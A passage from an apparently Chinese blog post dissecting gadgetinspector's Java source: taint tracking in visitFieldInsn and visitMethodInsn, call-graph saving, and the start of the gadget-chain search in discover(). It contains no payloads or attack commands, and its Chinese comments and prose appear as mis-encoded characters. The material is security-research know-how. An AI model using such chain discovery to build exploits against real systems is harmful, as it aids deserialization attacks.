String desc)</span> &#123;    <span class="comment">// è®¿é—®å­—æ®µæŒ‡ä»¤ï¼Œå­—æ®µæŒ‡ä»¤æ˜¯åŠ è½½æˆ–å­˜å‚¨å¯¹è±¡å­—æ®µå€¼çš„æŒ‡ä»¤ã€‚</span></span><br><span class="line">    <span class="comment">// æ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­å¯èƒ½è®¿é—®å¯¹è±¡å­—æ®µï¼Œè®¿é—®å‰ä¼šè¿›è¡Œå…¥æ ˆæ“ä½œ</span></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETSTATIC: <span class="comment">// è·å–ç±»çš„é™æ€å­—æ®µ</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTSTATIC: <span class="comment">// è®¾ç½®ç±»çš„é™æ€å­—æ®µ</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.GETFIELD:  <span class="comment">// è·å–å¯¹è±¡å­—æ®µ</span></span><br><span class="line">            <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> Type.getType(desc); <span class="comment">// å­—æ®µç±»å‹</span></span><br><span class="line">            <span class="keyword">if</span> (type.getSize() == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">Boolean</span> <span class="variable">isTransient</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">// å¦‚æœå­—æ®µè¢« transient å…³é”®å­—ä¿®é¥°ï¼Œåˆ™ä¸å¯åºåˆ—åŒ–</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// åˆ¤æ–­è¯»å–çš„å­—æ®µæ‰€å±ç±»æ˜¯å¦å¯åºåˆ—åŒ–ï¼Œå³å­—æ®µæ˜¯å¦å¯ä»¥åºåˆ—åŒ–</span></span><br><span class="line">                <span class="comment">// If a field type could not possibly be serialized, it&#x27;s effectively transient</span></span><br><span class="line">                <span class="keyword">if</span> (!couldBeSerialized(serializableDecider, inheritanceMap, <span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(type.getInternalName()))) &#123;</span><br><span class="line">                    isTransient = Boolean.TRUE;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// è‹¥è¯»å–çš„å­—æ®µæ‰€å±ç±»å¯åºåˆ—åŒ–</span></span><br><span class="line">                    <span class="type">ClassReference</span> <span class="variable">clazz</span> <span class="operator">=</span> classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner));</span><br><span class="line">                    <span class="keyword">while</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// éå†ç±»çš„æ‰€æœ‰å­—æ®µ</span></span><br><span class="line">                        <span class="keyword">for</span> (ClassReference.Member member : clazz.getMembers()) &#123;</span><br><span class="line">                            <span class="comment">// æ˜¯å¦ä¸ºç›®æ ‡å­—æ®µ</span></span><br><span class="line">                            <span class="keyword">if</span> (member.getName().equals(name)) &#123;</span><br><span class="line">                                <span class="comment">// æ˜¯å¦è¢« transient å…³é”®å­—ä¿®é¥°</span></span><br><span class="line">                                isTransient = (member.getModifiers() &amp; Opcodes.ACC_TRANSIENT) != <span class="number">0</span>;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (isTransient != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// è‹¥æ‰¾ä¸åˆ°ç›®æ ‡å­—æ®µï¼Œåˆ™å‘ä¸ŠæŸ¥æ‰¾ï¼ˆè¶…ç±»ï¼‰</span></span><br><span class="line">                        clazz = classMap.get(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(clazz.getSuperClass()));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°ç´¢å¼•é›†åˆ</span></span><br><span class="line">                Set&lt;String&gt; newTaint = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">                <span class="keyword">if</span> (!Boolean.TRUE.equals(isTransient)) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (String s : getStackTaint(<span class="number">0</span>)) &#123;</span><br><span class="line">                        newTaint.add(s + <span class="string">&quot;.&quot;</span> + name);   <span class="comment">// æ‹¼æ¥åç§°</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitFieldInsn è¿›è¡Œå‡º/å…¥æ ˆæ“ä½œ</span></span><br><span class="line">                <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.setStackTaint å°†æ ˆé¡¶è®¾ç½®ä¸º newTaint</span></span><br><span class="line">                setStackTaint(<span class="number">0</span>, newTaint);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.PUTFIELD:  <span class="comment">// è®¾ç½®å¯¹è±¡å­—æ®µ</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitFieldInsn è¿›è¡Œå‡º/å…¥æ ˆæ“ä½œ</span></span><br><span class="line">    <span class="built_in">super</span>.visitFieldInsn(opcode, owner, name, desc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitMethodInsn</code> æ–¹æ³•åˆ†æè¢«è°ƒæ–¹æ³•çš„æ“ä½œæ•°æ ˆï¼Œæ ˆä¸­çš„å…ƒç´ è¦ä¹ˆä¸ºç©ºé›†åˆï¼Œè¦ä¹ˆä¸ºèƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°é›†åˆï¼Œæ¨¡æ‹Ÿæ“ä½œæ•°æ ˆçš„å…ƒç´ ä¸ªæ•°ï¼Œä½†å…ƒç´ å€¼æ˜¯é›†åˆï¼ˆæ¨¡æ‹Ÿå€¼ï¼Œä¸æ˜¯çœŸå®&#x2F;å®é™…å€¼ï¼‰ã€‚<br>æœ€å¼€å§‹çš„æ—¶å€™å·²ç»å°†å½“å‰æ–¹æ³•çš„å‚æ•°ä»¥ <code>argå‚æ•°ç´¢å¼•</code> çš„å½¢å¼å­˜å‚¨åˆ°äº†æœ¬åœ°å˜é‡è¡¨ï¼Œå½“è°ƒç”¨å…¶ä»–æ–¹æ³•æ—¶ï¼Œä¼šä»æœ¬åœ°å˜é‡è¡¨åŠ è½½æ•°æ®åˆ°æ ˆä¸­ï¼Œå¦‚æœç”¨åˆ°å¯¹è±¡å­—æ®µï¼Œåˆ™ä»¥ <code>argå‚æ•°ç´¢å¼•.å­—æ®µåç§°</code> çš„å½¢å¼å…¥æ ˆï¼Œå› æ­¤æ ¹æ®æ ˆä¸­å…ƒç´ çš„åç§°å°±å¯ä»¥å¾—çŸ¥æ–¹æ³•çš„å“ªäº›å‚æ•°ï¼ˆæ ¹æ®åç§°åˆ¤æ–­ï¼‰å½±å“äº†è¢«è°ƒæ–¹æ³•çš„å“ªäº›å‚æ•°ï¼ˆå·²çŸ¥å‚æ•°ä¸ªæ•°ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">visitMethodInsn</span><span class="params">(<span class="type">int</span> opcode, String owner, String name, String desc, <span class="type">boolean</span> itf)</span> &#123;  <span class="comment">// è®¿é—®æ–¹æ³•æŒ‡ä»¤ï¼Œæ–¹æ³•æŒ‡ä»¤æ˜¯è°ƒç”¨æ–¹æ³•çš„æŒ‡ä»¤ã€‚</span></span><br><span class="line">    <span class="comment">// è·å–è¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°å’Œç±»å‹ï¼Œéé™æ€æ–¹æ³•éœ€è¦æŠŠå®ä¾‹ç±»å‹æ”¾åœ¨ç¬¬ä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">    <span class="comment">// æ ¹æ®æè¿°ç¬¦å¾—å‡ºè¢«è°ƒç”¨æ–¹æ³•çš„å‚æ•°ç±»å‹ï¼ˆå ç”¨ç©ºé—´å¤§å°ï¼‰</span></span><br><span class="line">    Type[] argTypes = Type.getArgumentTypes(desc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éé™æ€æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯¹è±¡æœ¬èº«ï¼Œå³ this</span></span><br><span class="line">    <span class="keyword">if</span> (opcode != Opcodes.INVOKESTATIC) &#123;   <span class="comment">// éé™æ€æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å®ä¾‹</span></span><br><span class="line">        Type[] extendedArgTypes = <span class="keyword">new</span> <span class="title class_">Type</span>[argTypes.length + <span class="number">1</span>];</span><br><span class="line">        System.arraycopy(argTypes, <span class="number">0</span>, extendedArgTypes, <span class="number">1</span>, argTypes.length);</span><br><span class="line">        extendedArgTypes[<span class="number">0</span>] = Type.getObjectType(owner);    <span class="comment">// å¯¹è±¡ç±»å‹</span></span><br><span class="line">        argTypes = extendedArgTypes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESTATIC:      <span class="comment">// è°ƒç”¨é™æ€æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEVIRTUAL:     <span class="comment">// è°ƒç”¨å®ä¾‹æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKESPECIAL:     <span class="comment">// è°ƒç”¨è¶…ç±»æ„é€ æ–¹æ³•ï¼Œå®ä¾‹åˆå§‹åŒ–æ–¹æ³•ï¼Œç§æœ‰æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.INVOKEINTERFACE:   <span class="comment">// è°ƒç”¨æ¥å£æ–¹æ³•</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">stackIndex</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="comment">// è¢«è°ƒç”¨æ–¹æ³•çš„æ“ä½œæ•°æ ˆ</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; argTypes.length; i++) &#123;</span><br><span class="line">                <span class="comment">// æœ€å³è¾¹çš„å‚æ•°ï¼Œå°±æ˜¯æœ€åå…¥æ ˆï¼Œå³åœ¨æ ˆé¡¶</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> argTypes.length - <span class="number">1</span> - i; <span class="comment">// å‚æ•°ç´¢å¼•</span></span><br><span class="line">                <span class="type">Type</span> <span class="variable">type</span> <span class="operator">=</span> argTypes[argIndex]; <span class="comment">// å‚æ•°ç±»å‹</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// å‚æ•°ä»å³å¾€å·¦å…¥æ ˆï¼Œå› æ­¤æœ€å³è¾¹çš„å‚æ•°åœ¨æ ˆåº•</span></span><br><span class="line">                Set&lt;String&gt; taint = getStackTaint(stackIndex);</span><br><span class="line">                <span class="keyword">if</span> (taint.size() &gt; <span class="number">0</span>) &#123; <span class="comment">// å¦‚æœå­˜åœ¨èƒ½å¤Ÿä¼ é€’æ±¡æŸ“çš„å‚æ•°</span></span><br><span class="line">                    <span class="comment">// éå†å‚æ•°</span></span><br><span class="line">                    <span class="keyword">for</span> (String argSrc : taint) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!argSrc.substring(<span class="number">0</span>, <span class="number">3</span>).equals(<span class="string">&quot;arg&quot;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid taint arg: &quot;</span> + argSrc);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// argæ•°å­—.å­—æ®µåç§°</span></span><br><span class="line">                        <span class="type">int</span> <span class="variable">dotIndex</span> <span class="operator">=</span> argSrc.indexOf(<span class="string">&#x27;.&#x27;</span>); <span class="comment">// åˆ†éš”ä½ç½®</span></span><br><span class="line">                        <span class="type">int</span> srcArgIndex;    <span class="comment">// ç¬¬å‡ ä¸ªå‚æ•°</span></span><br><span class="line">                        String srcArgPath;</span><br><span class="line">                        <span class="keyword">if</span> (dotIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">                            srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>));</span><br><span class="line">                            srcArgPath = <span class="literal">null</span>;  <span class="comment">// æ²¡æœ‰åç§°</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            srcArgIndex = Integer.parseInt(argSrc.substring(<span class="number">3</span>, dotIndex));</span><br><span class="line">                            srcArgPath = argSrc.substring(dotIndex + <span class="number">1</span>);  <span class="comment">// å­—æ®µåç§°</span></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// è®°å½•å‚æ•°æµåŠ¨å…³ç³»</span></span><br><span class="line">                        <span class="comment">// argIndexï¼šå½“å‰æ–¹æ³•å‚æ•°ç´¢å¼•ï¼›srcArgIndexï¼šå¯¹åº”ä¸Šä¸€çº§æ–¹æ³•çš„å‚æ•°ç´¢å¼•</span></span><br><span class="line">                        discoveredCalls.add(<span class="keyword">new</span> <span class="title class_">GraphCall</span>(</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(<span class="built_in">this</span>.owner), <span class="built_in">this</span>.name, <span class="built_in">this</span>.desc),</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">MethodReference</span>.Handle(<span class="keyword">new</span> <span class="title class_">ClassReference</span>.Handle(owner), name, desc),</span><br><span class="line">                                srcArgIndex,</span><br><span class="line">                                srcArgPath,</span><br><span class="line">                                argIndex));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// å¾€å·¦ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">                stackIndex += type.getSize();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unsupported opcode: &quot;</span> + opcode);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨ TaintTrackingMethodVisitor.visitMethodInsn æ‰§è¡Œå‡º/å…¥æ ˆæ“ä½œ</span></span><br><span class="line">    <span class="built_in">super</span>.visitMethodInsn(opcode, owner, name, desc, itf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>save</code> æ–¹æ³•å­˜å‚¨åˆ†æå¾—åˆ°çš„è°ƒç”¨å…³ç³»ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ä½¿ç”¨å·¥å‚æ–¹æ³•å­˜å‚¨è°ƒç”¨å…³ç³»ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>), <span class="keyword">new</span> <span class="title class_">GraphCall</span>.Factory(), discoveredCalls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="8-GadgetChainDiscovery"><a href="#8-GadgetChainDiscovery" class="headerlink" title="8. GadgetChainDiscovery"></a>8. GadgetChainDiscovery</h2><p>é’ˆå¯¹ä¸åŒçš„æŒ–æ˜ç±»å‹ï¼Œæ±¡ç‚¹æºä¿¡æ¯æ”¶é›†çš„å®ç°ä¸åŒï¼Œè¿™é‡Œå…³æ³¨ Java åŸç”Ÿåºåˆ—åŒ–çš„æ±¡ç‚¹æºï¼Œåˆ†æå·²ç»åœ¨ <strong>0x02 é¡¹ç›®ç»“æ„ - gadgetinspector&#x2F;javaserial - SimpleSourceDiscovery</strong> ä¸€èŠ‚ä¸­ç»™å‡ºã€‚</p><p>æŒ–æ˜åˆ©ç”¨é“¾å®é™…å°±æ˜¯æ‰¾ä¸€æ¡ä» source ç‚¹åˆ° sink ç‚¹çš„è·¯å¾„ï¼Œå‰é¢æ”¶é›†çš„ä¿¡æ¯éƒ½æ˜¯ä¸ºäº†è¿™é‡Œçš„æœç´¢åšå‡†å¤‡ã€‚</p><p>è¿™é‡Œå®šä¹‰äº†ä¸¤ä¸ªç±»åˆ†åˆ«è¡¨ç¤ºåˆ©ç”¨é“¾å’Œåˆ©ç”¨é“¾ä¸Šçš„çš„èŠ‚ç‚¹ï¼ˆå³æ–¹æ³•ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ©ç”¨é“¾</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">GadgetChain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;GadgetChainLink&gt; links;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">GadgetChain</span><span class="params">(List&lt;GadgetChainLink&gt; links)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.links = links;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">GadgetChain</span><span class="params">(GadgetChain gadgetChain, GadgetChainLink link)</span> &#123;</span><br><span class="line">        List&lt;GadgetChainLink&gt; links = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;GadgetChainLink&gt;(gadgetChain.links);</span><br><span class="line">        links.add(link);</span><br><span class="line">        <span class="built_in">this</span>.links = links;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ©ç”¨é“¾ï¼ˆèŠ‚ç‚¹ï¼‰</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">GadgetChainLink</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> MethodReference.Handle method;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> taintedArgIndex;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">GadgetChainLink</span><span class="params">(MethodReference.Handle method, <span class="type">int</span> taintedArgIndex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.method = method;</span><br><span class="line">        <span class="built_in">this</span>.taintedArgIndex = taintedArgIndex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == o) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="literal">null</span> || getClass() != o.getClass()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">GadgetChainLink</span> <span class="variable">that</span> <span class="operator">=</span> (GadgetChainLink) o;</span><br><span class="line">        <span class="keyword">if</span> (taintedArgIndex != that.taintedArgIndex) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> method != <span class="literal">null</span> ? method.equals(that.method) : that.method == <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> method != <span class="literal">null</span> ? method.hashCode() : <span class="number">0</span>;</span><br><span class="line">        result = <span class="number">31</span> * result + taintedArgIndex;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>discover</code> æ–¹æ³•é¦–å…ˆåŠ è½½æ–¹æ³•ä¿¡æ¯ã€ç»§æ‰¿ä¿¡æ¯ï¼Œè°ƒç”¨ <code>InheritanceDeriver.getAllMethodImplementations</code> è·å–æ–¹æ³•çš„é‡å†™ä¿¡æ¯ï¼Œåˆ†æä¹Ÿå·²ç»åœ¨ <strong>0x02 é¡¹ç›®ç»“æ„</strong> ä¸€èŠ‚ä¸­ç»™å‡ºï¼Œå¹¶ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œå†åŠ è½½ä¸Šä¸€æ­¥å¾—åˆ°çš„è°ƒç”¨å…³ç³»ä¿¡æ¯ã€‚</p><p>ç„¶ååŠ è½½æ±¡ç‚¹æºä¿¡æ¯ï¼Œå°†æ¯ä¸ª source æ–¹æ³•ä½œä¸ºåˆå§‹èŠ‚ç‚¹åˆ›å»ºä¸€æ¡é“¾ï¼ŒåŠ å…¥å¾…åˆ†æçš„é“¾é›†åˆã€‚éå†é›†åˆä¸­çš„é“¾ï¼Œå–å‡ºé“¾å¹¶ä»å°¾èŠ‚ç‚¹ï¼ˆæ–¹æ³•ï¼‰å¼€å§‹åˆ†æï¼Œç¬¬ä¸€æ¬¡åˆ†ææ±¡ç‚¹æºï¼Œå¦‚æœå…¶å‚æ•°ç´¢å¼•ä¸è¢«è°ƒæ–¹æ³•çš„å‚æ•°ç´¢å¼•ç›¸åŒï¼Œåˆ™åˆ›å»ºæ–°èŠ‚ç‚¹å¹¶åŠ å…¥é“¾çš„æœ€æœ«ç«¯ï¼Œå¦‚æœè¢«è°ƒæ–¹æ³•ä¸æ˜¯ sink ç‚¹ï¼Œåˆ™åŠ å…¥å¾…åˆ†æçš„é“¾é›†åˆï¼Œå¦åˆ™åŠ å…¥å‘ç°çš„åˆ©ç”¨é“¾é›†åˆã€‚ä¹‹åé‡å¤ä¸Šé¢çš„æ­¥éª¤ï¼Œé›†åˆä¸­å¾…åˆ†æçš„é“¾ä¼šè¶Šæ¥è¶Šé•¿ï¼Œç›´åˆ°æ‰€æœ‰é“¾éƒ½è¢«å¼¹å‡ºå’Œåˆ†æå®Œæ¯•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æœç´¢å¯èƒ½çš„åˆ©ç”¨é“¾ï¼Œä¿å­˜åˆ° gadget-chains.txt ä¸­</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">discover</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// åŠ è½½æ–¹æ³•ä¿¡æ¯</span></span><br><span class="line">    Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">  